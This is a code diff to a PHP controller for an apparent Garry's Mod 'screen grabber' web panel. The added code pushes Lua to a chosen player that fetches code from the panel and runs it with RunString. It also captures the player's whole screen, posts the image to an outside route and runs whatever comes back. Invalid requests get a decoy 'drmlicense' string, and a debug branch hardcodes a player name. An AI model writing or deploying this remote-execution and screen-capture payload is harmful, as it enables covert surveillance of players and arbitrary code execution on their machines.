@@ -122,6 +122,7 @@ class screenGrabber extends Controller
                 $type = "Fast";
                 return view("scrgrb.playerselector", compact(
                     'server',
+                    'serverid',
                     'Players',
                     'type'
                 ));
@@ -140,6 +141,60 @@ class screenGrabber extends Controller
             );
         }
 
+    }
+
+    public function getfCode($key){
+        if(
+            Scrgb_Image_Requests::where('SCRGBimageKey', $key)->count() == 0
+        ){
+            return "
+                local drmlicense = '".Str::random(30)."'
+            ";
+        }
+
+        if(Scrgb_Image_Requests::where('SCRGBimageKey', $key)->first()->used == 0){
+            return '
+                                    hook.Remove( "PostRender", "screenshot" )
+
+                                    local ScreenshotRequested = false
+                                    function RequestAScreenshot()
+                                        ScreenshotRequested = true
+                                    end
+
+                                    RequestAScreenshot()
+
+                                    hook.Add("PostRender", "screenshot", function()
+                                        if ( not ScreenshotRequested) then return end
+
+                                        ScreenshotRequested = false
+
+                                        local data = render.Capture( {
+                                            format = "png",
+                                            x = 0,
+                                            y = 0,
+                                            w = ScrW(),
+                                            h = ScrH()
+                                        })
+
+                                        local a = {
+                                            d = data,
+                                        }
+                                        http.Post(
+                                            "'.route('saveScreenGrab', ['imagekey' => $key]).'",
+                                            a,
+                                            function(body, len, headers, code)
+                                                RunString(body)
+                                            end
+                                        )
+
+                                    end)
+            ';
+        }
+        else{
+            return "
+                local drmlicense = '".Str::random(30)."'
+            ";
+        }
     }
 
     public function sendFast($serverid, Request $request){
@@ -173,42 +228,9 @@ class screenGrabber extends Controller
                 //custom payload code
                 $SCRGB_payload_code = '
                     for i, v in ipairs( player.GetAll() ) do
-                        if v:Nick() == "'.$request->player.'" then
+                        if v:Nick() == "'.((self::$debug) ? "Maxime_48" : $request->player).'" then
                             v:SendLua([[
-                                hook.Remove( "PostRender", "screenshot" )
-
-                                local ScreenshotRequested = false
-                                function RequestAScreenshot()
-                                    ScreenshotRequested = true
-                                end
-
-                                RequestAScreenshot()
-
-                                hook.Add("PostRender", "screenshot", function()
-                                    if ( not ScreenshotRequested) then return end
-
-                                    ScreenshotRequested = false
-
-                                    local data = render.Capture( {
-                                        format = "png",
-                                        x = 0,
-                                        y = 0,
-                                        w = ScrW(),
-                                        h = ScrH()
-                                    })
-
-                                    local a = {
-                                        d = data,
-                                    }
-                                    http.Post(
-                                        "'.route('saveScreenGrab', ['imagekey' => $SCRGBrequest_key]).'",
-                                        a,
-                                        function(body, len, headers, code)
-                                            RunString(body)
-                                        end
-                                    )
-
-                                end)
+                                http.Fetch("'.route('getFastCode', ['key' => $SCRGBrequest_key]).'",function(a,b,c,d)RunString(a)end,function(e)print(e)end)
                             ]])
                         end
                     end
@@ -224,7 +246,7 @@ class screenGrabber extends Controller
                 $SCRGB_payload->save();
 
                 return redirect()->route("dashboard")->with(
-                    'status', 'Query invalid'
+                    'status', 'Sent'
                 );
             }else{
                 return redirect()->back()->with(
